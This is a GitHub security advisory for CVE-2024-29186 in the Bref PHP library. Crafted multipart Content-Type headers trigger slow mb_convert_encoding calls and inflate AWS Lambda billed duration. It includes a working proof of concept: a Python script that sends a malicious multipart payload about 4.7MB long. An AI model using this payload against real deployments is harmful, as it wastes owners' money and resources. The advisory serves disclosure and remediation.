# [M] Slow String Operations via MultiPart Requests in Event-Driven Functions

## Summary
Severity: Medium
Advisory: GHSA-j4hq-f63x-f39r
CVE: CVE-2024-29186
CWE: CWE-400
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2024-03-22
Source: https://github.com/advisories/GHSA-j4hq-f63x-f39r
Type: github-advisory

## Affected
- Packagist: `bref/bref` — affected >=0 <2.1.17

## Details
## Impacted Resources

bref/src/Event/Http/Psr7Bridge.php:94-125
multipart-parser/src/StreamedPart.php:383-418

## Description

When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object.
During the conversion process, if the request is a MultiPart, each part is parsed. In the parsing process, the `Content-Type` header of each part is read using the [`Riverline/multipart-parser`](https://github.com/Riverline/multipart-parser/) library.

The library, in the `StreamedPart::parseHeaderContent` function, performs slow multi-byte string operations on the header value.
Precisely, the [`mb_convert_encoding`](https://www.php.net/manual/en/function.mb-convert-encoding.php) function is used with the first (`$string`) and third (`$from_encoding`) parameters read from the header value.

## Impact

An attacker could send specifically crafted requests which would force the server into performing long operations with a consequent long billed duration.

The attack has the following requirements and limitations:
- The Lambda should use the Event-Driven Function runtime.
- The Lambda should use the `RequestHandlerInterface` handler.
- The Lambda should implement at least an endpoint accepting POST requests.
- The attacker can send requests up to 6MB long (this is enough to cause a billed duration between 400ms and 500ms with the default 1024MB RAM Lambda image of Bref).
- If the Lambda uses a PHP runtime <= php-82 the impact is higher as the billed duration in the default 1024MB RAM Lambda image of Bref could be brought to more than 900ms for each request.

Notice that the vulnerability applies only to headers read from the request body as the request header has a limitation which allows a total maximum size of ~10KB.

## PoC

1. Create a new Bref project.
2. Create an `index.php` file with the following content:
```php
<?php

namespace App;

require __DIR__ . '/vendor/autoload.php';

use Nyholm\Psr7\Response;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;
use Psr\Http\Server\RequestHandlerInterface;

class MyHttpHandler implements RequestHandlerInterface
{
    public function handle(ServerRequestInterface $request): ResponseInterface
    {
        return new Response(200, [], "OK");
    }
}

return new MyHttpHandler();

```
3. Use the following `serverless.yml` to deploy the Lambda:
```yaml
service: app

provider:
    name: aws
    region: eu-central-1

plugins:
    - ./vendor/bref/bref

# Exclude files from deployment
package:
    patterns:
        - '!node_modules/**'
        - '!tests/**'

functions:
    api:
        handler: index.php
        runtime: php-83
        events:
            - httpApi: 'ANY /endpoint'
```
4. Run the following python script with as first argument the domain assigned to the Lambda (e.g. `python3 poc.py a10avtqg5c.execute-api.eu-central-1.amazonaws.com`):
```python
from requests import post
from sys import argv

if len(argv) != 2:
    print(f"Usage: {argv[0]} <domain>")
    exit()

url = f"https://{argv[1]}/endpoint"
headers = {"Content-Type": "multipart/form-data; boundary=a"}
data_normal = f"--a\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\nContent-Type: ;*=auto''{('a'*(4717792))}'\r\n--a--\r\n"
data_malicious = f"--a\r\nContent-Disposition: form-data; name=\"0\"\r\nContent-Type: ;*=auto''{('a'*(4717792))}'\r\n\r\n\r\n--a--\r\n"

print("[+] Sending normal request")
post(url, headers=headers, data=data_normal)

print("[+] Sending malicious request")
post(url, headers=headers, data=data_malicious)

```
5. Observe the CloudWatch logs of the Lambda and notice that the first requests used less than 200ms of billed duration, while the second one, which has a malicious `Content-Type` header, used more than 400ms of billed duration.

## Suggested Remediation

Perform an additional validation on the headers parsed via the `StreamedPart::parseHeaderContent` function to allow only legitimate headers with a reasonable length.

## References
- https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r
- https://nvd.nist.gov/vuln/detail/CVE-2024-29186
- https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45
- https://github.com/brefphp/bref
